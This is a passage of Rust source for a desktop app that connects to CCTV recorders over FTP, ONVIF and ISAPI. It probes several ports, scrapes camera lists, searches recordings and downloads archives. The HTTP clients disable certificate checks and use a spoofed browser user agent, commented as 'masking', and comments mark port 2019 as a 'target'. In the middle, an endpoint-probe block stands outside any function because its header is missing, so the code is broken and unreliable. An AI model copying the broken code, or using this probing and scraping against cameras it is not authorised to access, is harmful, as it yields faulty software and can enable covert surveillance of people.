    push_runtime_log(&log_state, format!("FTP list completed ({} entries)", folders.len()));
    Ok(folders)
}

#[tauri::command]
fn download_ftp_file(
    server_alias: &str,
    folder_path: String,
    filename: String,
    resume_if_exists: Option<bool>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    let task_key = task_id.unwrap_or_else(|| {
        format!(
            "{}_{}_{}",
            server_alias,
            filename,
            Utc::now().timestamp_millis()
        )
    });
    push_runtime_log(
        &log_state,
        format!(
            "FTP download requested: {} from {} [task:{}]",
            filename, server_alias, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    let cfg = resolve_ftp_config(server_alias)?;

    let _banner = ftp_banner_probe(cfg.host, 3)?;
    let mut ftp = ftp_connect_with_retry(cfg.host, cfg.user, cfg.pass, 3)?;

    let normalized_folder = folder_path.trim().trim_matches('/').to_string();
    let mut retr_candidates = vec![filename.clone()];
    if !normalized_folder.is_empty() {
        retr_candidates.push(format!("{}/{}", normalized_folder, filename));
        retr_candidates.push(format!("/{}/{}", normalized_folder, filename));
        retr_candidates.push(format!("./{}/{}", normalized_folder, filename));
    }
    retr_candidates.sort();
    retr_candidates.dedup();

    if folder_path != "/" && !folder_path.is_empty() {
        if let Err(e) = ftp.cwd(&folder_path) {
            push_runtime_log(
                &log_state,
                format!(
                    "FTP cwd failed for '{}' ({}), switching to low-level RETR path fallbacks",
                    folder_path, e
                ),
            );
        }
    }

    let path = get_vault_path()
        .join("archives")
        .join(server_alias)
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let resume = resume_if_exists.unwrap_or(true);
    let local_size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    let mut remote_size = 0u64;
    for candidate in &retr_candidates {
        if let Ok(sz) = ftp.size(candidate) {
            remote_size = sz as u64;
            break;
        }
    }

    if resume && local_size > 0 && remote_size > 0 && local_size >= remote_size {
        push_runtime_log(
            &log_state,
            format!(
                "FTP skip: {} already complete ({} bytes)",
                filename, local_size
            ),
        );

        let _ = ftp.quit();
        return Ok(DownloadReport {
            server_alias: server_alias.to_string(),
            filename,
            save_path: path.to_string_lossy().to_string(),
            bytes_written: 0,
            total_bytes: local_size,
            duration_ms: 0,
            resumed: false,
            skipped_as_complete: true,
        });
    }

    let started = std::time::Instant::now();
    let mut resumed = false;

    if resume && local_size > 0 {
        if ftp.resume_transfer(local_size as usize).is_ok() {
            resumed = true;
            push_runtime_log(
                &log_state,
                format!(
                    "FTP resume enabled for {} from offset {}",
                    filename, local_size
                ),
            );
        } else {
            push_runtime_log(
                &log_state,
                format!(
                    "FTP resume rejected for {}, fallback to full download",
                    filename
                ),
            );
        }
    }

    let mut retr_path_used = String::new();
    let mut last_retr_err = String::new();
    let mut data_stream_opt = None;
    for candidate in &retr_candidates {
        match ftp.retr_as_stream(candidate) {
            Ok(stream) => {
                retr_path_used = candidate.clone();
                data_stream_opt = Some(stream);
                break;
            }
            Err(e) => {
                last_retr_err = format!("{} => {}", candidate, e);
            }
        }
    }

    let mut resumed_downgraded = false;
    if data_stream_opt.is_none() && resumed {
        push_runtime_log(
            &log_state,
            format!(
                "FTP resume stream setup failed for {} ({}), reconnecting without resume",
                filename, last_retr_err
            ),
        );
        let _ = ftp.quit();
        ftp = ftp_connect_with_retry(cfg.host, cfg.user, cfg.pass, 2)?;
        if folder_path != "/" && !folder_path.is_empty() {
            let _ = ftp.cwd(&folder_path);
        }

        for candidate in &retr_candidates {
            match ftp.retr_as_stream(candidate) {
                Ok(stream) => {
                    retr_path_used = candidate.clone();
                    data_stream_opt = Some(stream);
                    resumed_downgraded = true;
                    break;
                }
                Err(e) => {
                    last_retr_err = format!("{} => {}", candidate, e);
                }
            }
        }
    }

    let mut data_stream = data_stream_opt
        .ok_or_else(|| format!("FTP RETR failed for all path candidates: {}", last_retr_err))?;

    if resumed_downgraded {
        resumed = false;
        push_runtime_log(
            &log_state,
            format!(
                "FTP resume degraded to full download for {} (path: {})",
                filename, retr_path_used
            ),
        );
    }

    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(!resumed)
        .append(resumed)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let mut chunk = [0u8; 64 * 1024];
    let progress_step = 2 * 1024 * 1024u64;
    let mut next_progress_mark = progress_step;

    loop {
        let n = std::io::Read::read(&mut data_stream, &mut chunk).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = ftp.quit();
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(&task_key);
            }
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err(format!(
                "Загрузка отменена пользователем [task:{}]",
                task_key
            ));
        }

        std::io::Write::write_all(&mut file, &chunk[..n]).map_err(|e| e.to_string())?;
        bytes_written += n as u64;

        let current_total = local_size + bytes_written;
        if current_total >= next_progress_mark {
            push_runtime_log(
                &log_state,
                format!(
                    "DOWNLOAD_PROGRESS|{}|{}|{}",
                    task_key,
                    current_total,
                    remote_size.max(current_total)
                ),
            );
            next_progress_mark += progress_step;
        }
    }

    if let Err(e) = ftp.finalize_retr_stream(data_stream) {
        let msg = e.to_string();
        let soft_ok = msg.contains("226") || msg.contains("425") || msg.contains("timed out");
        if soft_ok {
            push_runtime_log(
                &log_state,
                format!("FTP finalize warning ignored for {}: {}", filename, msg),
            );
        } else {
            return Err(msg);
        }
    }

    let _ = ftp.quit();
    let duration_ms = started.elapsed().as_millis();
    let total_bytes = if resumed {
        local_size + bytes_written
    } else {
        bytes_written
    };

    push_runtime_log(
        &log_state,
        format!(
            "FTP download finished: {} from {} via {} (written {} bytes, total {} bytes, {} ms) [task:{}]",
            filename, server_alias, retr_path_used, bytes_written, total_bytes, duration_ms, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    Ok(DownloadReport {
        server_alias: server_alias.to_string(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes,
        duration_ms,
        resumed,
        skipped_as_complete: false,
    })
}

#[tauri::command]
fn cancel_download_task(
    task_id: String,
    cancel_state: State<'_, DownloadCancelState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    let mut cancelled = cancel_state
        .cancelled_tasks
        .lock()
        .map_err(|_| "Failed to access cancel state".to_string())?;
    cancelled.insert(task_id.clone());
    push_runtime_log(
        &log_state,
        format!("Download cancel requested [task:{}]", task_id),
    );
    Ok("cancel_requested".into())
}

#[tauri::command]
fn get_runtime_logs(
    limit: Option<usize>,
    state: State<'_, LogState>,
) -> Result<Vec<String>, String> {
    let limit = limit.unwrap_or(100).min(500);
    let logs = state
        .lines
        .lock()
        .map_err(|_| "Failed to access runtime logs".to_string())?;

    let start = logs.len().saturating_sub(limit);
    Ok(logs[start..].to_vec())
}

#[tauri::command]
async fn videodvor_login(
    username: String,
    password: String,
    state: tauri::State<'_, VideodvorState>,
) -> Result<String, String> {
    let mut scanner = state.scanner.lock().await;
    scanner.login(&username, &password).await?;
    Ok("Logged in".into())
}

#[tauri::command]
async fn videodvor_scrape(
    state: tauri::State<'_, VideodvorState>,
) -> Result<Vec<serde_json::Value>, String> {
    let scanner = state.scanner.lock().await;
    scanner.scrape_all_cameras().await
}

#[tauri::command]
async fn videodvor_list_archive(
    ip: String,
    state: tauri::State<'_, VideodvorState>,
) -> Result<Vec<String>, String> {
    let scanner = state.scanner.lock().await;
    scanner.get_archive_files(&ip).await
}

#[tauri::command]
async fn videodvor_download_file(
    ip: String,
    filename: String,
    state: tauri::State<'_, VideodvorState>,
) -> Result<String, String> {
    let scanner = state.scanner.lock().await;
    scanner.download_file(&ip, &filename).await?;
    Ok("Download started".into())
}

// --- ФУНКЦИИ ДЛЯ СОВМЕСТИМОСТИ С videodvor_scanner.rs ---

pub fn scan_ftp_archive(
    ip: String,
    ftp_host: String,
    ftp_user: String,
    ftp_pass: String,
) -> Result<Vec<String>, String> {
    let host = format!("{}:21", ftp_host);
    let _ = ftp_banner_probe(&host, 2);
    let mut ftp = ftp_connect_with_retry(&host, &ftp_user, &ftp_pass, 2)?;

    if ip != "/" && !ip.is_empty() {
        let _ = ftp.cwd(&ip);
    }
    let list = ftp_nlst_root_with_fallback(&mut ftp)?;
    let _ = ftp.quit();
    Ok(list)
}

pub fn download_ftp_scanner(
    ip: String,
    filename: String,
    ftp_host: String,
    ftp_user: String,
    ftp_pass: String,
) -> Result<String, String> {
    let host = format!("{}:21", ftp_host);
    let _ = ftp_banner_probe(&host, 2);
    let mut ftp = ftp_connect_with_retry(&host, &ftp_user, &ftp_pass, 2)?;

    let _ = ftp.cwd(&ip);
    let data = ftp.retr_as_buffer(&filename).map_err(|e| e.to_string())?;

    // Путь сохранения для сканера
    let path = get_vault_path().join("archives").join(&ip).join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());
    std::fs::write(&path, data.into_inner()).map_err(|e| e.to_string())?;

    let _ = ftp.quit();
    Ok("Ok".into())
}

#[tauri::command]
async fn probe_nvr_protocols(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<Vec<ProtocolProbeResult>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для проверки протоколов".into());
    }

    push_runtime_log(
        &log_state,
        format!("Protocol probe started for {}", clean_host),
    );

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(6))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36") // <-- МАСКИРОВКА
        .build()
        .map_err(|e| e.to_string())?;

    let mut out = Vec::new();

    // 🔥 ДОБАВЛЕН ПОРТ 2019 🔥
    let onvif_endpoints = vec![
        format!("http://{}:80/onvif/device_service", clean_host),
        format!("http://{}:8080/onvif/device_service", clean_host),
        format!("http://{}:2019/onvif/device_service", clean_host),
        format!("https://{}:443/onvif/device_service", clean_host),
        format!("https://{}:8443/onvif/device_service", clean_host),
    ];

    for endpoint in onvif_endpoints {
        let status = match client.get(&endpoint).send().await {
            Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 401 => "detected",
            Ok(_) => "not_detected",
            Err(_) => "unreachable",
        };
        out.push(ProtocolProbeResult {
            protocol: "ONVIF".into(),
            endpoint,
            status: status.into(),
        });
    }

    // 🔥 ДОБАВЛЕН ПОРТ 2019 🔥
    let isapi_endpoints = vec![
        format!("http://{}:80/ISAPI/System/deviceInfo", clean_host),
        format!("http://{}:8080/ISAPI/System/deviceInfo", clean_host),
        format!("http://{}:2019/ISAPI/System/deviceInfo", clean_host),
        format!("https://{}:443/ISAPI/System/deviceInfo", clean_host),
        format!("https://{}:8443/ISAPI/System/deviceInfo", clean_host),
    ];

    for endpoint in isapi_endpoints {
        let status = match client
            .get(&endpoint)
            .basic_auth(login.clone(), Some(pass.clone()))
            .send()
            .await
        {
            Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 401 => "detected",
            Ok(_) => "not_detected",
            Err(_) => "unreachable",
        };
        out.push(ProtocolProbeResult {
            protocol: "ISAPI".into(),
            endpoint,
            status: status.into(),
        });
    }

    let detected = out.iter().filter(|x| x.status == "detected").count();
    push_runtime_log(
        &log_state,
        format!(
            "Protocol probe finished for {} (detected: {})",
            clean_host, detected
        ),
    );
    Ok(out)
}

#[tauri::command]
async fn fetch_nvr_device_info(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<NvrDeviceInfoResult, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для ISAPI deviceInfo".into());
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36") // <-- МАСКИРОВКА
        .build()
        .map_err(|e| e.to_string())?;

    let candidates = vec![
        format!("http://{}:80/ISAPI/System/deviceInfo", clean_host),
        format!("http://{}:8080/ISAPI/System/deviceInfo", clean_host),
        format!("https://{}:443/ISAPI/System/deviceInfo", clean_host),
        format!("http://{}:2019/ISAPI/System/deviceInfo", clean_host),
        format!("https://{}:8443/ISAPI/System/deviceInfo", clean_host),
    ];

    push_runtime_log(
        &log_state,
        format!("ISAPI deviceInfo fetch started for {}", clean_host),
    );

    for endpoint in candidates {
        let resp = client
            .get(&endpoint)
            .basic_auth(login.clone(), Some(pass.clone()))
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status_code = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status_code == 200 || status_code == 401 {
                    let preview = text.chars().take(600).collect::<String>();
                    push_runtime_log(
                        &log_state,
                        format!(
                            "ISAPI deviceInfo response {} from {}",
                            status_code, endpoint
                        ),
                    );
                    return Ok(NvrDeviceInfoResult {
                        endpoint,
                        status: status_code.to_string(),
                        body_preview: preview,
                    });
                }
            }
            Err(_) => {}
        }
    }

    push_runtime_log(
        &log_state,
        format!("ISAPI deviceInfo unavailable for {}", clean_host),
    );

    Err("ISAPI deviceInfo endpoint не найден или недоступен".into())
}

#[tauri::command]
async fn fetch_onvif_device_info(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<NvrDeviceInfoResult, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для ONVIF device info".into());
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36") // <-- МАСКИРОВКА
        .build()
        .map_err(|e| e.to_string())?;

    let candidates = vec![
        format!("http://{}:80/onvif/device_service", clean_host),
        format!("http://{}:8080/onvif/device_service", clean_host),
        format!("https://{}:443/onvif/device_service", clean_host),
        format!("https://{}:8443/onvif/device_service", clean_host),
    ];

    let soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <s:Body>
    <tds:GetDeviceInformation/>
  </s:Body>
</s:Envelope>"#;

    push_runtime_log(
        &log_state,
        format!("ONVIF device info fetch started for {}", clean_host),
    );

    for endpoint in candidates {
        let resp = client
            .post(&endpoint)
            .header("Content-Type", "application/soap+xml; charset=utf-8")
            .basic_auth(login.clone(), Some(pass.clone()))
            .body(soap.to_string())
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status_code = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status_code == 200 || status_code == 401 {
                    let preview = text.chars().take(600).collect::<String>();
                    push_runtime_log(
                        &log_state,
                        format!(
                            "ONVIF device info response {} from {}",
                            status_code, endpoint
                        ),
                    );
                    return Ok(NvrDeviceInfoResult {
                        endpoint,
                        status: status_code.to_string(),
                        body_preview: preview,
                    });
                }
            }
            Err(_) => {}
        }
    }

    push_runtime_log(
        &log_state,
        format!("ONVIF device info unavailable for {}", clean_host),
    );

    Err("ONVIF device_service недоступен или не поддерживает GetDeviceInformation".into())
}

#[tauri::command]
async fn search_isapi_recordings(
    host: String,
    login: String,
    pass: String,
    from_time: Option<String>,
    to_time: Option<String>,
    log_state: State<'_, LogState>,
) -> Result<Vec<IsapiRecordingItem>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для ISAPI search".into());
    }

    let from = from_time.unwrap_or_else(|| "2026-01-01T00:00:00Z".into());
    let to = to_time.unwrap_or_else(|| "2026-12-31T23:59:59Z".into());

    let body = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<SearchDescription>
  <searchID>1</searchID>
  <trackList><trackID>101</trackID></trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
  <metadataList><metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor></metadataList>
</SearchDescription>"#,
        from, to
    );

    let candidates = vec![
        format!("http://{}:80/ISAPI/ContentMgmt/search", clean_host),
        format!("http://{}:8080/ISAPI/ContentMgmt/search", clean_host),
        format!("https://{}:443/ISAPI/ContentMgmt/search", clean_host),
        format!("https://{}:8443/ISAPI/ContentMgmt/search", clean_host),
    ];

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    push_runtime_log(
        &log_state,
        format!(
            "ISAPI search started for {} [{} - {}]",
            clean_host, from, to
        ),
    );

    let start_re = Regex::new(r"<startTime>([^<]+)</startTime>").map_err(|e| e.to_string())?;
    let end_re = Regex::new(r"<endTime>([^<]+)</endTime>").map_err(|e| e.to_string())?;
    let track_re = Regex::new(r"<trackID>([^<]+)</trackID>").map_err(|e| e.to_string())?;
    let uri_re = Regex::new(r"<playbackURI>([^<]+)</playbackURI>").map_err(|e| e.to_string())?;

    for endpoint in candidates {
        let resp = client
            .post(&endpoint)
            .header("Content-Type", "application/xml")
            .basic_auth(login.clone(), Some(pass.clone()))
            .body(body.clone())
            .send()
            .await;

        match resp {
            Ok(r) => {
                let code = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if code != 200 {
                    continue;
                }

                let starts: Vec<String> = start_re
                    .captures_iter(&text)
                    .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                    .collect();
                let ends: Vec<String> = end_re
                    .captures_iter(&text)
                    .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                    .collect();
                let tracks: Vec<String> = track_re
                    .captures_iter(&text)
                    .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                    .collect();
                let uris: Vec<String> = uri_re
                    .captures_iter(&text)
                    .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                    .collect();

                let count = [starts.len(), ends.len(), tracks.len(), uris.len()]
                    .into_iter()
                    .max()
                    .unwrap_or(0)
                    .min(40);
                let mut items = Vec::with_capacity(count.max(1));

                if count == 0 {
                    items.push(IsapiRecordingItem {
                        endpoint: endpoint.clone(),
                        track_id: None,
                        start_time: None,
                        end_time: None,
                        playback_uri: None,
                    });
                } else {
                    for i in 0..count {
                        items.push(IsapiRecordingItem {
                            endpoint: endpoint.clone(),
                            track_id: tracks.get(i).cloned(),
                            start_time: starts.get(i).cloned(),
                            end_time: ends.get(i).cloned(),
                            playback_uri: uris.get(i).cloned(),
                        });
                    }
                }

                push_runtime_log(
                    &log_state,
                    format!(
                        "ISAPI search finished for {} via {} (items: {})",
                        clean_host,
                        endpoint,
                        items.len()
                    ),
                );
                return Ok(items);
            }
            Err(_) => continue,
        }
    }

    push_runtime_log(
        &log_state,
        format!("ISAPI search unavailable for {}", clean_host),
    );
    Err("ISAPI ContentMgmt/search недоступен или вернул неподдерживаемый ответ".into())
}

#[tauri::command]
async fn search_onvif_recordings(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<Vec<OnvifRecordingItem>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для ONVIF recordings search".into());
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    // 🔥 ДОБАВЛЕН ПОРТ 2019 В СПИСОК КАНДИДАТОВ 🔥
    let endpoints = vec![
        format!("http://{}:80/onvif/recording_service", clean_host),
        format!("http://{}:8080/onvif/recording_service", clean_host),
        format!("http://{}:2019/onvif/recording_service", clean_host), // <-- НАШ ЦЕЛЕВОЙ ПОРТ
        format!("https://{}:443/onvif/recording_service", clean_host),
        format!("https://{}:8443/onvif/recording_service", clean_host),
    ];

    let soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trc="http://www.onvif.org/ver10/recording/wsdl">
  <s:Body>
    <trc:GetRecordings/>
  </s:Body>
</s:Envelope>"#;

    let token_re =
        Regex::new(r"<[^>]*RecordingToken[^>]*>([^<]+)</[^>]+>").map_err(|e| e.to_string())?;

    push_runtime_log(
        &log_state,
        format!("ONVIF recordings search started for {}", clean_host),
    );

    for endpoint in endpoints {
        let resp = client
            .post(&endpoint)
            .header("Content-Type", "application/soap+xml; charset=utf-8")
            .basic_auth(login.clone(), Some(pass.clone()))
            .body(soap.to_string())
            .send()
            .await;

        match resp {
            Ok(r) => {
                if !r.status().is_success() && r.status().as_u16() != 401 {
                    continue;
                }
                let text = r.text().await.unwrap_or_default();
                let mut out = Vec::new();
                for cap in token_re.captures_iter(&text) {
                    if let Some(m) = cap.get(1) {
                        out.push(OnvifRecordingItem {
                            endpoint: endpoint.clone(),
                            token: m.as_str().trim().to_string(),
                        });
                    }
                }

                if !out.is_empty() {
                    push_runtime_log(
                        &log_state,
                        format!(
                            "ONVIF recordings search finished for {} via {} (tokens: {})",
                            clean_host,
                            endpoint,
                            out.len()
                        ),
                    );
                    return Ok(out);
                }
            }
            Err(_) => {}
        }
    }

    push_runtime_log(
        &log_state,
        format!("ONVIF recordings search unavailable for {}", clean_host),
    );
    Err("ONVIF recording_service недоступен или не вернул recording tokens".into())
}

let candidates: Vec<(String, String, String)> = vec![
        // --- СТАНДАРТНЫЕ ПОРТЫ ---
        (
            "ISAPI".into(),
            "GET".into(),
            format!("http://{}:80/ISAPI/ContentMgmt/search", clean_host),
        ),
        (
            "ISAPI".into(),
            "GET".into(),
            format!("http://{}:80/ISAPI/ContentMgmt/record/tracks", clean_host),
        ),
        (
            "ISAPI".into(),
            "GET".into(),
            format!("https://{}:443/ISAPI/ContentMgmt/search", clean_host),
        ),
        (
            "ISAPI".into(),
            "GET".into(),
            format!("https://{}:443/ISAPI/ContentMgmt/record/tracks", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("http://{}:80/onvif/recording_service", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("http://{}:8080/onvif/recording_service", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("https://{}:443/onvif/recording_service", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("https://{}:8443/onvif/recording_service", clean_host),
        ),

        // 🔥 --- ЦЕЛЕВЫЕ ПОРТЫ АЗГУРЫ (2019) --- 🔥
        (
            "ISAPI".into(),
            "GET".into(),
            format!("http://{}:2019/ISAPI/ContentMgmt/search", clean_host),
        ),
        (
            "ISAPI".into(),
            "GET".into(),
            format!("http://{}:2019/ISAPI/ContentMgmt/record/tracks", clean_host),
        ),
        (
            "ONVIF".into(),
            "POST".into(),
            format!("http://{}:2019/onvif/recording_service", clean_host),
        ),
    ];

    let onvif_probe_soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trc="http://www.onvif.org/ver10/recording/wsdl">
  <s:Body>
    <trc:GetRecordings/>
  </s:Body>
</s:Envelope>"#;

    let mut out = Vec::with_capacity(candidates.len());

    for (protocol, method, endpoint) in candidates {
        let resp = if method == "GET" {
            client
                .get(&endpoint)
                .basic_auth(login.clone(), Some(pass.clone()))
                .send()
                .await
        } else {
            client
                .post(&endpoint)
                .header("Content-Type", "application/soap+xml; charset=utf-8")
                .basic_auth(login.clone(), Some(pass.clone()))
                .body(onvif_probe_soap.to_string())
                .send()
                .await
        };

        let item = match resp {
            Ok(r) => {
                let code = r.status().as_u16();
                let status = if code == 200 || code == 401 || code == 405 {
                    "detected"
                } else {
                    "not_detected"
                };
                ArchiveEndpointResult {
                    protocol,
                    endpoint,
                    method,
                    status: status.into(),
                    status_code: Some(code),
                }
            }
            Err(_) => ArchiveEndpointResult {
                protocol,
                endpoint,
                method,
                status: "unreachable".into(),
                status_code: None,
            },
        };

        out.push(item);
    }

    let detected = out.iter().filter(|x| x.status == "detected").count();
    push_runtime_log(
        &log_state,
        format!(
            "Archive endpoint probe finished for {} (detected: {})",
            clean_host, detected
        ),
    );

    Ok(out)
}

#[tauri::command]
async fn download_onvif_recording_token(
    endpoint: String,
    recording_token: String,
    login: String,
    pass: String,
    filename_hint: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    if endpoint.trim().is_empty() {
        return Err("Пустой endpoint для ONVIF download".into());
    }
    if recording_token.trim().is_empty() {
        return Err("Пустой recording_token".into());
    }

    let task_key = task_id.unwrap_or_else(|| format!("onvif_{}", Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    push_runtime_log(
        &log_state,
        format!(
            "ONVIF download requested: token {} via {} [task:{}]",
            recording_token, endpoint, task_key
        ),
    );

    let soap = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:trp="http://www.onvif.org/ver10/replay/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema">
  <s:Body>
    <trp:GetReplayUri>
      <trp:StreamSetup>
        <tt:Stream>RTP-Unicast</tt:Stream>
        <tt:Transport>
          <tt:Protocol>RTSP</tt:Protocol>
        </tt:Transport>
      </trp:StreamSetup>
      <trp:RecordingToken>{}</trp:RecordingToken>
    </trp:GetReplayUri>
  </s:Body>
</s:Envelope>"#,
        recording_token
    );

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(45))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let replay_resp = client
        .post(&endpoint)
        .header("Content-Type", "application/soap+xml; charset=utf-8")
        .basic_auth(login.clone(), Some(pass.clone()))
        .body(soap)
        .send()
        .await
        .map_err(|e| e.to_string())?;

    let replay_body = replay_resp.text().await.map_err(|e| e.to_string())?;
    let uri_re = Regex::new(r"<[^>]*Uri[^>]*>([^<]+)</[^>]+>").map_err(|e| e.to_string())?;
    let replay_uri = uri_re
        .captures(&replay_body)
        .and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string()))
        .ok_or_else(|| "ONVIF replay URI не найден в ответе GetReplayUri".to_string())?;

    push_runtime_log(
        &log_state,
        format!("ONVIF replay URI resolved for token {}", recording_token),
    );

    let replay_uri_lc = replay_uri.to_ascii_lowercase();
    if replay_uri_lc.starts_with("rtsp://") || replay_uri_lc.starts_with("rtsps://") {
        push_runtime_log(
            &log_state,
            format!(
                "ONVIF replay URI for token {} is RTSP, starting ffmpeg capture: {}",
                recording_token, replay_uri
            ),
        );

        let mut filename = filename_hint
            .clone()
            .map(|s| sanitize_filename_component(&s))
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| format!("onvif_record_{}.mp4", Utc::now().timestamp()));
        if !filename.contains('.') {
            filename.push_str(".mp4");
        }

        let path = get_vault_path()
            .join("archives")
            .join("onvif")
            .join(&filename);
        let _ = std::fs::create_dir_all(path.parent().unwrap());

        let ffmpeg = get_vault_path().join("ffmpeg.exe");
        let output_path = path.to_string_lossy().to_string();
        let mut child = Command::new(&ffmpeg)
            .args([
                "-y",
                "-rtsp_transport",
                "tcp",
                "-i",
                &replay_uri,
                "-c",
                "copy",
                &output_path,
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|e| format!("Не удалось запустить ffmpeg для ONVIF RTSP: {}", e))?;

        let started = std::time::Instant::now();
        let mut last_progress_log = std::time::Instant::now();
        let mut last_size: u64 = 0;
        loop {
            if cancel_state
                .cancelled_tasks
                .lock()
                .map(|set| set.contains(&task_key))
                .unwrap_or(false)
            {
                let _ = child.kill();
                let _ = std::fs::remove_file(&path);
                if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                    cancelled.remove(&task_key);
                }
                push_runtime_log(
                    &log_state,
                    format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
                );
                return Err(format!(
                    "Загрузка отменена пользователем [task:{}]",
                    task_key
                ));
            }

            match child.try_wait() {
                Ok(Some(status)) => {
                    if !status.success() {
                        let stderr_preview = if let Some(mut stderr) = child.stderr.take() {
                            use std::io::Read;
                            let mut buf = String::new();
                            let _ = stderr.read_to_string(&mut buf);
                            buf.lines()
                                .rev()
                                .take(5)
                                .collect::<Vec<_>>()
                                .into_iter()
                                .rev()
                                .collect::<Vec<_>>()
                                .join(" | ")
                        } else {
                            String::new()
                        };
                        let tail = if stderr_preview.is_empty() {
                            "нет stderr от ffmpeg".to_string()
                        } else {
                            format!("stderr: {}", stderr_preview)
                        };
                        return Err(format!(
                            "ffmpeg завершился с ошибкой: {} ({})",
                            status, tail
                        ));
                    }
                    break;
                }
                Ok(None) => {}
                Err(e) => return Err(format!("Ошибка ожидания ffmpeg: {}", e)),
            }

            if last_progress_log.elapsed() >= std::time::Duration::from_secs(1) {
                let current_size = std::fs::metadata(&path)
                    .map(|m| m.len())
                    .unwrap_or(last_size);
                if current_size > last_size {
                    push_runtime_log(
                        &log_state,
                        format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, current_size),
                    );
                    last_size = current_size;
                }
                last_progress_log = std::time::Instant::now();
            }

            if started.elapsed() > std::time::Duration::from_secs(180) {
                let _ = child.kill();
